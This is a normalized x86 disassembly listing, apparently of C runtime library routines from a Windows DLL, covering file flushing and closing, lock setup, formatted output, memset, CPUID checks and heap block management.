jl r-xdata
mov eax [ esi + 0x8 ]
lea ecx [ eax + edi ]
jmp r-xdata
mov ecx [ ebp - 0x100c ]
mov ebx [ ebp - 0x1020 ]
cmp ebx ecx
ja r-xdata
jl r-xdata
mov edi [ esi + 0x18 ]
mov ecx [ esi + 0xc ]
test cl 0x8
je r-xdata
test eax eax
jb r-xdata
cmp eax ecx
jb r-xdata
lea eax [ ebp - 0x1004 ]
test ebx ebx
je r-xdata
test eax eax
jb r-xdata
inc edi
mov edi eax
test ecx 0x400
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ esi + 0xc ] 0x2000
jmp r-xdata
lea ecx [ ebp - 0x1004 ]
sub eax ecx
xor edx edx
add eax esi
adc edx edi
jmp r-xdata
lea edx [ ebp + ecx - 0x1004 ]
mov eax [ ebp - 0x101c ]
mov eax [ eax ]
test [ eax + ebx + 0x4 ] 0x4
inc eax
inc edi
je r-xdata
mov cl [ eax ]
cmp cl 0xd
jne r-xdata
movzx ecx cl
movsx ecx [ ecx + rw-data ]
add eax ecx
lea ecx [ edx - 0x1 ]
cmp eax ecx
jae r-xdata
dec ebx
cmp eax edx
jae r-xdata
inc eax
test ebx ebx
jne r-xdata
lea ecx [ eax + 0x1 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax ecx
jmp r-xdata
sub_1001a0c7
push 0x10
push r--data
call sub_10018984
push [ ebp + 0x8 ]
call sub_1001352f
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_10019d7b
pop ecx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a107
mov eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_100189c9
retn
sub_1001a111
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
push edi
test al 0x83
je r-xdata
call sub_100167f3
mov [ eax ] 0x16
mov edi [ ebp + 0x14 ]
test edi edi
je r-xdata
and eax 0xffffffef
mov [ esi + 0xc ] eax
cmp edi 0x1
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_1001178a
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_10019d7b
add [ ebp + 0xc ] eax
pop ecx
adc [ ebp + 0x10 ] edx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_100190d8
pop ecx
push eax
call sub_1001fdaa
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
test al 0x8
je r-xdata
or eax 0xffffffff
xor eax eax
jmp r-xdata
test eax 0x400
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi + 0x18 ] 0x200
sub_1001a1ad
push 0xc
push r--data
call sub_10018984
push [ ebp + 0x8 ]
call sub_1001352f
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001a111
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a1f2
mov eax [ ebp - 0x1c ]
call sub_100189c9
retn
sub_1001a1fc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_10011c31
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_1001a22d
push 0x10
push r--data
call sub_10018984
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_100167f3
mov [ eax ] 0x9
call sub_100167f3
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010b6c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_100189c9
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_100202c9
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_100167f3
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_10020252
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a304
mov eax [ ebp - 0x1c ]
call sub_10016806
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_1001a30e
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_1001d612
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_1001a359
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_10011c31
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_1001a3c7
push 0xc
push r--data
call sub_10018984
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_10018dad
push 0x1e
call sub_10018c02
push 0xff
call sub_10013b3c
push 0x18
call sub_100166a9
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_1001a48a
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_100167f3
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_100189c9
retn
push edi
call sub_10011c31
pop ecx
push 0xfa0
push edi
call sub_1001d612
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_10011c31
pop ecx
call sub_100167f3
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a481
mov eax [ ebp - 0x1c ]
sub_1001a48a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_1001a3c7
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_10013ae8
pop ecx
sub_1001a4bd
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10020252
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_10016819
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_10020252
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_10020252
push 0x1
mov edi eax
call sub_10020252
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_100201cc
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_1001a559
push 0x10
push r--data
call sub_10018984
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_10016806
and [ eax ] 0x0
call sub_100167f3
mov [ eax ] 0x9
call sub_10016806
mov [ eax ] edi
call sub_100167f3
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10010b6c
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_100189c9
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_100202c9
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_100167f3
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_1001a4bd
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001a61c
mov eax [ ebp - 0x1c ]
sub_1001a626
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_100137b8
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_100167f3
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10010b6c
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_100190d8
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_1001b1be
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
je r-xdata
call sub_100167f3
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_100167f3
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
dec eax
dec eax
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_10018f74
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_1001b28a
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
call sub_100167f3
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_100167f3
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] ebx
ja r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_1002076f
call sub_1001b1be
add esp 0x18
cmp eax ebx
jge r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] bl
pop esi
call sub_100167f3
mov [ eax ] 0x22
sub_1001b312
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_1001b369
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_1001b369
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_1001b312
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_1001b448
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_1001b3f8
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_1001b4b7
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_1001b4e7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_10017580
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_1001b7fd
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_1001b8ad
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_1001b9b5
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
